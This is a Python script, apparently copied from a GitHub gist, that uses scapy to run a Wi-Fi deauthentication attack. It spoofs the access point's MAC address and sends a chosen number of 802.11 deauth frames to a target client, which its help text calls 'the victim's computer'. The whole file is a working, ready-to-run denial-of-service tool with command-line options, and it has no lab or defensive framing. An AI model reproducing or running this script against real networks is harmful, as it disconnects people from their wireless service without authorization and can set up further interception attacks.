#!/usr/bin/python3

#https://gist.githubusercontent.com/bin3xish477/67111cd4ab9313b73a8639e959750903/raw/282076f81277685a35ff52d35ddc3821402fa530/deauthenticator.py

from scapy.all import (
  RadioTap,    # Adds additional metadata to an 802.11 frame
  Dot11,       # For creating 802.11 frame
  Dot11Deauth, # For creating deauth frame
  sendp        # for sending packets
)
from argparse import ArgumentParser as AP
from sys import exit
import logging

def deauth(iface: str, count: int, bssid: str, target_mac: str):
    """
    - addr1=target_mac specifies that this packet will go to the victim's computer
    - addr2=bssid specifies the MAC address of the AP 
    - addr3=bssid is the same as addr2
    """
    dot11 = Dot11(addr1=target_mac, addr2=bssid, addr3=bssid)
    frame = RadioTap()/dot11/Dot11Deauth()
    logging.warning(f"Sending deauth: client: {target_mac}, AP: {bssid}")
    sendp(frame, iface=iface, count=count, inter=0.100)

if __name__ == "__main__":
    parser = AP(description="Perform Deauthentication attack against a computer")
    parser.add_argument("-i", "--interface",help="interface to send deauth packets from")
    parser.add_argument("-c", "--count",help="The number of deauthentication packets to send to the victim computer")
    parser.add_argument("-a", "--bssid",metavar="MAC",help="the MAC address of the access point (Airodump-ng BSSID)")
    parser.add_argument("-t", "--target-mac",metavar="MAC",help="the MAC address of the victim's computer (Airodump-ng Station)")
    args = parser.parse_args()
    if (not args.interface or not args.count 
        or not args.bssid or not args.target_mac):
        print("[-] Please specify all program arguments... run `sudo python3 deauthenticator.py -h` for help")
        exit(1)
    deauth(args.interface, int(args.count), args.bssid, args.target_mac)
    
